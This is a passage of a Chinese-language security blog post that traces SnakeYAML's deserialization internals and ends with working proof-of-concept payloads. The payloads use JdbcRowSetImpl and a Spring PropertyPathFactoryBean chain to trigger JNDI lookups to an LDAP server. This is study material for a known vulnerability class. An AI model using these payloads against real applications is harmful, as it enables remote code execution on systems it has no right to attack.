+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span> Object <span class="title function_">constructObject</span><span class="params">(Node node)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (constructedObjects.containsKey(node)) &#123;</span><br><span class="line">        <span class="keyword">return</span> constructedObjects.get(node);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> constructObjectNoCheck(node);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>他就检查你constructedObjects缓存里面有没有node这个，有就获取，没有就加，我们肯定没有，我们跟进去<code>BaseConstructor#constructObjectNoCheck</code></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">protected Object constructObjectNoCheck(Node node) &#123;</span><br><span class="line">    if (recursiveObjects.contains(node)) &#123;</span><br><span class="line">        throw new ConstructorException(null, null, &quot;found unconstructable recursive node&quot;,</span><br><span class="line">                node.getStartMark());</span><br><span class="line">    &#125;</span><br><span class="line">    recursiveObjects.add(node);</span><br><span class="line">    Construct constructor = getConstructor(node);</span><br><span class="line">    Object data = (constructedObjects.containsKey(node)) ? constructedObjects.get(node)</span><br><span class="line">            : constructor.construct(node);</span><br><span class="line"></span><br><span class="line">    finalizeConstruction(node, data);</span><br><span class="line">    constructedObjects.put(node, data);</span><br><span class="line">    recursiveObjects.remove(node);</span><br><span class="line">    if (node.isTwoStepsConstruction()) &#123;</span><br><span class="line">        constructor.construct2ndStep(node, data);</span><br><span class="line">    &#125;</span><br><span class="line">    return data;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>这里检查在recursiveObjects缓存里面有没有，没有就加进去，然后获得可以构造你这个类的构造器，然后再次检查在不在constructedObjects，接着就构造，我们跟进<code>Construct$ConstructYamlObject#construct</code></p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> Object <span class="title function_">construct</span><span class="params">(Node node)</span> &#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> getConstructor(node).construct(node);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (ConstructorException e) &#123;</span><br><span class="line">        <span class="keyword">throw</span> e;</span><br><span class="line">    &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">ConstructorException</span>(<span class="literal">null</span>, <span class="literal">null</span>, <span class="string">&quot;Can&#x27;t construct a java object for &quot;</span></span><br><span class="line">                + node.getTag() + <span class="string">&quot;; exception=&quot;</span> + e.getMessage(), node.getStartMark(), e);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>就是获取你这个node的construct</p>
+<p>我们来到<code>construct$ConstructMapping#construct</code></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">public Object construct(Node node) &#123;</span><br><span class="line">    MappingNode mnode = (MappingNode) node;</span><br><span class="line">    if (Map.class.isAssignableFrom(node.getType())) &#123;</span><br><span class="line">        if (node.isTwoStepsConstruction()) &#123;</span><br><span class="line">            return newMap(mnode);</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            return constructMapping(mnode);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; else if (Collection.class.isAssignableFrom(node.getType())) &#123;</span><br><span class="line">        if (node.isTwoStepsConstruction()) &#123;</span><br><span class="line">            return newSet(mnode);</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            return constructSet(mnode);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        Object obj = Constructor.this.newInstance(mnode);</span><br><span class="line">        if (node.isTwoStepsConstruction()) &#123;</span><br><span class="line">            return obj;</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            return constructJavaBean2ndStep(mnode, obj);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>他会在<code>Object obj = Constructor.this.newInstance(mnode);</code>这里实例化</p>
+<p>我们跟进<code>Construct#constructJavaBean2ndStep</code></p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span> Object <span class="title function_">constructJavaBean2ndStep</span><span class="params">(MappingNode node, Object object)</span> &#123;</span><br><span class="line">    flattenMapping(node);</span><br><span class="line">    Class&lt;? <span class="keyword">extends</span> <span class="title class_">Object</span>&gt; beanType = node.getType();</span><br><span class="line">    List&lt;NodeTuple&gt; nodeValue = node.getValue();</span><br><span class="line">    <span class="keyword">for</span> (NodeTuple tuple : nodeValue) &#123;</span><br><span class="line">        ScalarNode keyNode;</span><br><span class="line">        <span class="keyword">if</span> (tuple.getKeyNode() <span class="keyword">instanceof</span> ScalarNode) &#123;</span><br><span class="line">            <span class="comment">// key must be scalar</span></span><br><span class="line">            keyNode = (ScalarNode) tuple.getKeyNode();</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">YAMLException</span>(</span><br><span class="line">                    <span class="string">&quot;Keys must be scalars but found: &quot;</span> + tuple.getKeyNode());</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">Node</span> <span class="variable">valueNode</span> <span class="operator">=</span> tuple.getValueNode();</span><br><span class="line">        <span class="comment">// keys can only be Strings</span></span><br><span class="line">        keyNode.setType(String.class);</span><br><span class="line">        <span class="type">String</span> <span class="variable">key</span> <span class="operator">=</span> (String) constructObject(keyNode);</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">TypeDescription</span> <span class="variable">memberDescription</span> <span class="operator">=</span> typeDefinitions.get(beanType);</span><br><span class="line">            <span class="type">Property</span> <span class="variable">property</span> <span class="operator">=</span> memberDescription == <span class="literal">null</span> ? getProperty(beanType, key)</span><br><span class="line">                    : memberDescription.getProperty(key);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (!property.isWritable()) &#123;</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">YAMLException</span>(<span class="string">&quot;No writable property &#x27;&quot;</span> + key + <span class="string">&quot;&#x27; on class: &quot;</span></span><br><span class="line">                        + beanType.getName());</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            valueNode.setType(property.getType());</span><br><span class="line">            <span class="keyword">final</span> <span class="type">boolean</span> <span class="variable">typeDetected</span> <span class="operator">=</span> (memberDescription != <span class="literal">null</span>)</span><br><span class="line">                    ? memberDescription.setupPropertyType(key, valueNode)</span><br><span class="line">                    : <span class="literal">false</span>;</span><br><span class="line">            <span class="keyword">if</span> (!typeDetected &amp;&amp; valueNode.getNodeId() != NodeId.scalar) &#123;</span><br><span class="line">                <span class="comment">// only if there is no explicit TypeDescription</span></span><br><span class="line">                Class&lt;?&gt;[] arguments = property.getActualTypeArguments();</span><br><span class="line">                <span class="keyword">if</span> (arguments != <span class="literal">null</span> &amp;&amp; arguments.length &gt; <span class="number">0</span>) &#123;</span><br><span class="line">                    <span class="comment">// type safe (generic) collection may contain the</span></span><br><span class="line">                    <span class="comment">// proper class</span></span><br><span class="line">                    <span class="keyword">if</span> (valueNode.getNodeId() == NodeId.sequence) &#123;</span><br><span class="line">                        Class&lt;?&gt; t = arguments[<span class="number">0</span>];</span><br><span class="line">                        <span class="type">SequenceNode</span> <span class="variable">snode</span> <span class="operator">=</span> (SequenceNode) valueNode;</span><br><span class="line">                        snode.setListType(t);</span><br><span class="line">                    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (Set.class.isAssignableFrom(valueNode.getType())) &#123;</span><br><span class="line">                        Class&lt;?&gt; t = arguments[<span class="number">0</span>];</span><br><span class="line">                        <span class="type">MappingNode</span> <span class="variable">mnode</span> <span class="operator">=</span> (MappingNode) valueNode;</span><br><span class="line">                        mnode.setOnlyKeyType(t);</span><br><span class="line">                        mnode.setUseClassConstructor(<span class="literal">true</span>);</span><br><span class="line">                    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (Map.class.isAssignableFrom(valueNode.getType())) &#123;</span><br><span class="line">                        Class&lt;?&gt; keyType = arguments[<span class="number">0</span>];</span><br><span class="line">                        Class&lt;?&gt; valueType = arguments[<span class="number">1</span>];</span><br><span class="line">                        <span class="type">MappingNode</span> <span class="variable">mnode</span> <span class="operator">=</span> (MappingNode) valueNode;</span><br><span class="line">                        mnode.setTypes(keyType, valueType);</span><br><span class="line">                        mnode.setUseClassConstructor(<span class="literal">true</span>);</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="type">Object</span> <span class="variable">value</span> <span class="operator">=</span> (memberDescription != <span class="literal">null</span>)</span><br><span class="line">                    ? newInstance(memberDescription, key, valueNode)</span><br><span class="line">                    : constructObject(valueNode);</span><br><span class="line">            <span class="comment">// Correct when the property expects float but double was</span></span><br><span class="line">            <span class="comment">// constructed</span></span><br><span class="line">            <span class="keyword">if</span> (property.getType() == Float.TYPE || property.getType() == Float.class) &#123;</span><br><span class="line">                <span class="keyword">if</span> (value <span class="keyword">instanceof</span> Double) &#123;</span><br><span class="line">                    value = ((Double) value).floatValue();</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">// Correct when the property a String but the value is binary</span></span><br><span class="line">            <span class="keyword">if</span> (property.getType() == String.class &amp;&amp; Tag.BINARY.equals(valueNode.getTag())</span><br><span class="line">                    &amp;&amp; value <span class="keyword">instanceof</span> <span class="type">byte</span>[]) &#123;</span><br><span class="line">                value = <span class="keyword">new</span> <span class="title class_">String</span>((<span class="type">byte</span>[]) value);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (memberDescription == <span class="literal">null</span></span><br><span class="line">                    || !memberDescription.setProperty(object, key, value)) &#123;</span><br><span class="line">                property.set(object, value);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (DuplicateKeyException e) &#123;</span><br><span class="line">            <span class="keyword">throw</span> e;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">ConstructorException</span>(</span><br><span class="line">                    <span class="string">&quot;Cannot create property=&quot;</span> + key + <span class="string">&quot; for JavaBean=&quot;</span> + object,</span><br><span class="line">                    node.getStartMark(), e.getMessage(), valueNode.getStartMark(), e);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> object;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>他会在<code>property.set(object, value)</code>执行set,那么这个property是从哪里来的，在上面</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Property property = memberDescription == null ? getProperty(beanType, key)</span><br><span class="line">        : memberDescription.getProperty(key);</span><br></pre></td></tr></table></figure>
+
+<p>我们一直跟下去到<code>org.yaml.snakeyaml.introspector.PropertyUtils#getPropertiesMap</code></p>
+<p>他在</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">for (Class&lt;?&gt; c = type; c != null; c = c.getSuperclass()) &#123;</span><br><span class="line">    for (Field field : c.getDeclaredFields()) &#123;</span><br><span class="line">        int modifiers = field.getModifiers();</span><br><span class="line">        if (!Modifier.isStatic(modifiers) &amp;&amp; !Modifier.isTransient(modifiers)) &#123;</span><br><span class="line">            if (Modifier.isPublic(modifiers)) &#123;</span><br><span class="line">                properties.put(field.getName(), new FieldProperty(field));</span><br><span class="line">            &#125; else &#123;</span><br><span class="line">                inaccessableFieldsExist = true;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>判断是不是public，不是就put</p>
+<h2 id="SnakeYaml利用"><a href="#SnakeYaml利用" class="headerlink" title="SnakeYaml利用"></a>SnakeYaml利用</h2><p>其实感觉和fastjson差不多</p>
+<h3 id="jdbcRowSetImpl"><a href="#jdbcRowSetImpl" class="headerlink" title="jdbcRowSetImpl"></a>jdbcRowSetImpl</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">public class SnakeYamlJdbcRowSetImpl &#123;</span><br><span class="line">    public static void main(String[] args) &#123;</span><br><span class="line">        String poc = &quot;!!com.sun.rowset.JdbcRowSetImpl &#123;dataSourceName: \&quot;ldap://127.0.0.1:8085/NVxdkcxz\&quot;, autoCommit: true&#125;&quot;;</span><br><span class="line">        Yaml yaml = new Yaml();</span><br><span class="line">        Object data = yaml.load(poc);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="Spring-PropertyPathFactoryBean"><a href="#Spring-PropertyPathFactoryBean" class="headerlink" title="Spring PropertyPathFactoryBean"></a>Spring PropertyPathFactoryBean</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&lt;dependency&gt;</span><br><span class="line">    &lt;groupId&gt;org.springframework&lt;/groupId&gt;</span><br><span class="line">    &lt;artifactId&gt;spring-beans&lt;/artifactId&gt;</span><br><span class="line">    &lt;version&gt;5.3.10&lt;/version&gt; </span><br><span class="line">&lt;/dependency&gt;</span><br><span class="line">&lt;dependency&gt;</span><br><span class="line">    &lt;groupId&gt;org.springframework&lt;/groupId&gt;</span><br><span class="line">    &lt;artifactId&gt;spring-context&lt;/artifactId&gt;</span><br><span class="line">    &lt;version&gt;5.3.10&lt;/version&gt;</span><br><span class="line">&lt;/dependency&gt;</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">SimpleJndiBeanFactory factory = new SimpleJndiBeanFactory();</span><br><span class="line">    PropertyPathFactoryBean bean = new PropertyPathFactoryBean();</span><br><span class="line">    bean.setTargetBeanName(&quot;ldap://127.0.0.1:8085/UGPljNlX&quot;);</span><br><span class="line">    bean.setPropertyPath(&quot;123&quot;);</span><br><span class="line">    bean.setBeanFactory(factory);</span><br><span class="line">    bean.getObject();</span><br></pre></td></tr></table></figure>
+
+<p>这个也是lookup很简单</p>
+<p>写成yaml就是</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">String poc = &quot;!!org.springframework.beans.factory.config.PropertyPathFactoryBean\n&quot; +</span><br><span class="line">        &quot; targetBeanName: \&quot;ldap://127.0.0.1:8085/UGPljNlX\&quot;\n&quot; +</span><br><span class="line">        &quot; propertyPath: 1\n&quot; +</span><br><span class="line">        &quot; beanFactory: !!org.springframework.jndi.support.SimpleJndiBeanFactory\n&quot; +</span><br><span class="line">        &quot;  shareableResources: [\&quot;ldap://127.0.0.1:8085/UGPljNlX\&quot;]&quot;;</span><br><span class="line">Yaml yaml = new Yaml();</span><br><span class="line">yaml.load(poc);</span><br></pre></td></tr></table></figure>
+
+  </div>
+</article>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+        
+          <li><a href="/">Home</a></li>
+        
+          <li><a href="/about/">About</a></li>
+        
+          <li><a href="/archives/">Writing</a></li>
+        
+          <li><a target="_blank" rel="noopener" href="https://github.com/Mouri-Kogorou">Projects</a></li>
+        
+      </ul>
+    </div>
+
+    
+    
+      <div id="toc-footer" style="display: none">
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#SnakeYaml%E9%93%BE"><span class="toc-number">1.</span> <span class="toc-text">SnakeYaml链</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#yaml%E5%9F%BA%E7%A1%80"><span class="toc-number">1.1.</span> <span class="toc-text">yaml基础</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#yaml"><span class="toc-number">1.1.1.</span> <span class="toc-text">yaml</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#yaml%E6%95%B0%E6%8D%AE%E7%B1%BB%E5%9E%8B"><span class="toc-number">1.1.2.</span> <span class="toc-text">yaml数据类型</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#yaml%E5%B0%9D%E8%AF%95"><span class="toc-number">1.2.</span> <span class="toc-text">yaml尝试</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#load%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96"><span class="toc-number">1.2.1.</span> <span class="toc-text">load反序列化</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#dump%E5%BA%8F%E5%88%97%E5%8C%96"><span class="toc-number">1.2.2.</span> <span class="toc-text">dump序列化</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#load%E8%B0%83%E8%AF%95"><span class="toc-number">1.3.</span> <span class="toc-text">load调试</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#SnakeYaml%E5%88%A9%E7%94%A8"><span class="toc-number">1.4.</span> <span class="toc-text">SnakeYaml利用</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#jdbcRowSetImpl"><span class="toc-number">1.4.1.</span> <span class="toc-text">jdbcRowSetImpl</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Spring-PropertyPathFactoryBean"><span class="toc-number">1.4.2.</span> <span class="toc-text">Spring PropertyPathFactoryBean</span></a></li></ol></li></ol></li></ol>
+      </div>
+    
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://example.com/2025/05/18/SnakeYaml%E9%93%BE/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://example.com/2025/05/18/SnakeYaml%E9%93%BE/&text=SnakeYaml链"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://example.com/2025/05/18/SnakeYaml%E9%93%BE/&title=SnakeYaml链"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://example.com/2025/05/18/SnakeYaml%E9%93%BE/&is_video=false&description=SnakeYaml链"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=SnakeYaml链&body=Check out this article: http://example.com/2025/05/18/SnakeYaml%E9%93%BE/"><i class="fa-solid fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://example.com/2025/05/18/SnakeYaml%E9%93%BE/&title=SnakeYaml链"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://example.com/2025/05/18/SnakeYaml%E9%93%BE/&title=SnakeYaml链"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://example.com/2025/05/18/SnakeYaml%E9%93%BE/&title=SnakeYaml链"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://example.com/2025/05/18/SnakeYaml%E9%93%BE/&title=SnakeYaml链"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://example.com/2025/05/18/SnakeYaml%E9%93%BE/&name=SnakeYaml链&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://example.com/2025/05/18/SnakeYaml%E9%93%BE/&t=SnakeYaml链"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fa-solid fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
+        
+          <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fa-solid fa-list fa-lg" aria-hidden="true"></i> TOC</a>
+        
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fa-solid fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    2003-2025
+    Mouri-Kogorou
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+        <!--
+      --><li><a href="/">Home</a></li><!--
+    --><!--
+      --><li><a href="/about/">About</a></li><!--
+    --><!--
+      --><li><a href="/archives/">Writing</a></li><!--
+    --><!--
+      --><li><a target="_blank" rel="noopener" href="https://github.com/Mouri-Kogorou">Projects</a></li><!--
+    -->
+      </ul>
+      <ul>
+        
+          <!-- 不蒜子统计 -->
+          <span id="busuanzi_container_site_pv">
+              本站总访问量<span id="busuanzi_value_site_pv"></span>次
+          </span>
+          <span class="post-meta-divider">|</span>
+          <span id="busuanzi_container_site_uv" style='display:none'>
+                  本站访客数<span id="busuanzi_value_site_uv"></span>人
+          </span>
+        <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+        
+      </ul>
+    </nav>
+  </div>
+  
+</footer>
+
+    </div>
+    <!-- styles -->
+
+
+
+  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>
+
+
+    <!-- jquery -->
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script>
+
+
+
+
+<!-- clipboard -->
+
+  
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script>
+  
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
+    btn += '<i class="fa-regular fa-clone"></i>';
+    btn += '</span>';
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "Copied!");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Baidu Analytics -->
+
+<!-- Cloudflare Analytics -->
+
+<!-- Disqus Comments -->
+
+<!-- utterances Comments -->
+
+</body>
+</html>
